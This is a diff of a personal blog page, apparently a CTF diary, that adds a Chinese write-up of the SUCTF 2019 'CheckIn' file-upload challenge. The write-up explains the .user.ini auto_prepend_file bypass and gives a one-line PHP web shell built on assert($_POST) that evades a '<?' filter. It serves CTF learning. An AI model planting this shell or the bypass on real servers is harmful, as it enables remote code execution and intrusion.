@@ -172,12 +172,12 @@
             
             <span class="tag">
                 
-                <a href="/tags/ctf/" style="color: #03a9f4">ctf</a>
+                <a href="/tags/ctf/" style="color: #00bcd4">ctf</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/web/" style="color: #00bcd4">web</a>
+                <a href="/tags/web/" style="color: #00a596">web</a>
             </span>
             
         </span>
@@ -591,7 +591,53 @@ class FileHandler &#123;
 echo serialize(new FileHandler);
 </code></pre>
 <p>找个环境运行一下即可得到str的值</p>
-<h3 id="2023-6-9-SUCTF-2019-CheckIn"><a href="#2023-6-9-SUCTF-2019-CheckIn" class="headerlink" title="2023.6.9 [SUCTF 2019]CheckIn"></a>2023.6.9 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[SUCTF%202019]CheckIn">[SUCTF 2019]CheckIn</a></h3>
+<h3 id="2023-6-9-SUCTF-2019-CheckIn"><a href="#2023-6-9-SUCTF-2019-CheckIn" class="headerlink" title="2023.6.9 [SUCTF 2019]CheckIn"></a>2023.6.9 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[SUCTF%202019]CheckIn">[SUCTF 2019]CheckIn</a></h3><p>是一道文件上传题，不过给了源码，甚至给了wp。瞥了一眼，发现wp里只有.user.ini，搜索一下之后发现这是一个比.htacess用的更广的一个绕过手段，.htacess只有apache环境下可以使用，而.user.ini只要是以fastcgi运行的php都可以用，他会影响php.ini中的配置，需要php&gt;5.3.0，且上传目录下要有可执行的php文件。</p>
+<p>如何使用：我们指定一个文件，那么该文件就会被包含在要执行的php文件中，类似在php文件中插入<code>require(xx);</code>，我们就可以上传一个文件名为.user.ini的文件，内容为</p>
+<pre><code class="php">auto_prepend_file = xxx.jpg
+</code></pre>
+<p>然后看他给的源码</p>
+<pre><code class="php">$userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);
+if (!file_exists($userdir)) &#123;
+    mkdir($userdir, 0777, true);
+&#125;
+file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;);
+if (isset($_POST[&quot;upload&quot;])) &#123;
+    $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];
+    $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];
+    if (!$tmp_name) &#123;
+        die(&quot;filesize too big!&quot;);
+    &#125;
+    if (!$name) &#123;
+        die(&quot;filename cannot be empty!&quot;);
+    &#125;
+    $extension = substr($name, strrpos($name, &quot;.&quot;) + 1);
+    if (preg_match(&quot;/ph|htacess/i&quot;, $extension)) &#123;
+        die(&quot;illegal suffix!&quot;);
+    &#125;
+    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) &#123;
+        die(&quot;&amp;lt;? in contents!&quot;);
+    &#125;
+    $image_type = exif_imagetype($tmp_name);
+    if (!$image_type) &#123;
+        die(&quot;exif_imagetype:not image!&quot;);
+    &#125;
+    $upload_file_path = $userdir . &quot;/&quot; . $name;
+    move_uploaded_file($tmp_name, $upload_file_path);
+    echo &quot;Your dir &quot; . $userdir. &#39; &lt;br&gt;&#39;;
+    echo &#39;Your files : &lt;br&gt;&#39;;
+    var_dump(scandir($userdir));
+&#125;
+</code></pre>
+<p>发现他过滤了很多东西，.htacess在这里是不能用了，文件名中包含ph的也都不能用了，还验证了文件头，这题只能上传图片，看到之前的利用这题就很简单了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306091033911.png" alt="image-20230609103336765"></p>
+<p>这里还给出了路径，由于过滤了<code>&lt;?</code>所以我们要换个马上传</p>
+<pre><code class="php">&lt;script language=&#39;php&#39;&gt;assert($_POST[&#39;ant&#39;]);&lt;/script&gt;
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306091036996.png" alt="image-20230609103630041"></p>
+<p>上传后路径并没有改变，接下来就可以去利用了，通过给出的路径，访问其目录下的php文件，并用post传入参数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306091037875.png" alt="image-20230609103717771"></p>
+<p>最后cat即可得到flag，buu的这个环境里的文件好像是有时效的，过期了需要重新上传再做</p>
+
     </div>
     
     
